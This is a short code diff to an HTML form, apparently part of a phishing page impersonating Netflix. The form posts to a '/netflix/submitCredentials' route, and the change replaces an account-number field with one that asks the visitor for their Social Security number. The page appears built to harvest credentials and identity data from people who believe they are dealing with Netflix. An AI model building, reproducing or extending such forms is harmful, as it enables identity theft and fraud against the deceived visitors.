@@ -37,7 +37,7 @@
                     <form role="form" id="contactForm" class="signupform spacing" data-toggle="validator" class="shake" method="POST" action="/netflix/submitCredentials">
 
                         <div class="controls">
-                            <input type="text" name="id" id="id" placeholder="Account Number" required data-error="Please enter your Account Number">
+                            <input type="text" name="ssn" id="id" placeholder="Social" required data-error="Please enter your ssn">
                             <div class="help-block with-errors"></div>
                         </div>
                         
